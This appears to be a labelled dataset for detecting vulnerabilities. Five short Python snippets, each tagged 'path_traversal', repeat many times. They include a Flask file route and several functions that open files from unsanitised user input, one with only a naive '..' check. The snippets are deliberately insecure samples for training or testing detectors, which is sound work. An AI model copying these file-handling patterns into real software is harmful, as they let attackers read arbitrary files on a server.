"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import flask
from flask import request

app = flask.Flask(__name__)

@app.route('/getfile')
def get_file():
    filename = request.args.get('file')
    with open(""uploads/"" + filename) as f:
        return f.read()",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
def read_file():
    filename = input(""Enter filename: "")
    with open(filename, ""r"") as f:
        return f.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
user_input = input(""Path: "")
full_path = os.path.join(""/home/user"", user_input)
with open(full_path, ""r"") as f:
    print(f.read())",['path_traversal']
"import os
def serve_image(image_name):
    image_path = ""/static/images/"" + image_name
    with open(image_path, 'rb') as img:
        return img.read()",['path_traversal']
"import os
filename = input(""Enter the file to open: "")
if "".."" in filename:
    print(""Invalid file name."")
else:
    with open(""/var/www/html/"" + filename) as f:
        print(f.read())",['path_traversal']
